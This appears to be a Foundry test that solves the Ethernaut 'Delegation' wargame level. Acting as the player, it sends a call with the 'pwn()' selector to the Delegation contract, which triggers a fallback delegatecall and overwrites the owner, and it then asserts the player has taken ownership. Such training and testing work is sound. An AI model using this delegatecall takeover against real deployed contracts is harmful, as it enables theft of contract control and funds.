// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.36;

import {Test} from "forge-std/Test.sol";
import {Delegation} from "ethernaut/contracts/src/levels/Delegation.sol";
import {DelegationFactory} from "ethernaut/contracts/src/levels/DelegationFactory.sol";

contract DelegationTest is Test {
    address public immutable player = makeAddr("player");
    DelegationFactory public factory;
    Delegation public level;

    function setUp() public {
        factory = new DelegationFactory();
        level = Delegation(factory.createInstance(player));
    }

    function test_exploit_Delegation() public {
        assertNotEq(level.owner(), player);
        vm.startPrank(player);
        (bool success,) = address(level).call(abi.encodeWithSignature("pwn()"));
        assert(success);
        vm.stopPrank();
        assertEq(level.owner(), player);
    }
}
